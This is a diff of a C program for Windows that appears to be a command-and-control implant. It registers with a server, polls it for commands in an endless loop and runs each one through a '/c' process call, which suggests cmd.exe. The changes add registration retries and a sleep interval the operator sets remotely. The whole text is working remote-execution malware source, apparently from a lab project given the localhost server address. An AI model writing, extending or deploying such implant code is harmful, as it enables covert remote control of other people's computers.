@@ -50,7 +50,7 @@ BOOL SendRequest(LPCWSTR EndpointUrl, char* output) {
 }
 
 int main() {
-
+	BOOL default_time = TRUE;
 	wchar_t Base_Url[256] = L"https://127.0.0.1:5000/";
 	wchar_t Register_Url[256];
 	memcpy(Register_Url, Base_Url, sizeof(Register_Url));
@@ -59,6 +59,15 @@ int main() {
 	wprintf(L"%s\n", Register_Url);
 
 	char request_output[256] = { 0 };
+	for (int i = 0; i < 30; i++) {
+		if (!SendRequest(Register_Url, request_output)) {
+			Sleep(30 * 1000);
+			continue;
+		}
+		else {
+			break;
+		}
+	}
 	SendRequest(Register_Url, request_output);
 	printf("My UUID: %s\n", request_output);
 
@@ -76,9 +85,16 @@ int main() {
 
 	char command[256] = {0};
 	char command_stripped[256] = {0};
+	char time[256] = { 0 };
+	BOOL reached = FALSE;
+
 	while (TRUE) {
 		memset(command, 0, sizeof(command));
+		memset(command_stripped, 0, sizeof(command_stripped));
+		reached = FALSE;
+		
 		SendRequest(CommandUrl, command);
+		
 		char no_command_set[] = "No command set";
 		if (strcmp(command, no_command_set) == 0) {
 			printf("Recieved no Command\n");
@@ -88,17 +104,24 @@ int main() {
 
 			for (int i = 0; i < strlen(command); i++) {
 				if (command[i] == ';') {
-					break;
+					reached = TRUE;
+					default_time = FALSE;
+					memset(time, 0, sizeof(time));
+					continue;
+				}
+				else if (reached) {
+					strncat_s(time, sizeof(time), &command[i], 1);
 				}
 				else {
 					strncat_s(command_stripped, sizeof(command_stripped), &command[i], 1);
 				}
 			}
 
-			
 
 			wchar_t Process_Name[256];
 			swprintf(Process_Name, 256, L"/c %S", command_stripped);
+
+			printf("Process_Name: %ls\n", Process_Name);
 
 			STARTUPINFOW			SiW = { 0 };
 			PROCESS_INFORMATION		Pi = { 0 };
@@ -130,7 +153,15 @@ int main() {
 				CloseHandle(Pi.hThread);
 			}
 		}
-		Sleep(20 * 1000);
+		if (default_time) {
+			Sleep(30 * 1000);
+		}
+		else {
+			int int_time;
+			int_time = atoi(time);
+			Sleep(int_time * 1000);
+		}
+	
 	}
 	return 0;
 }
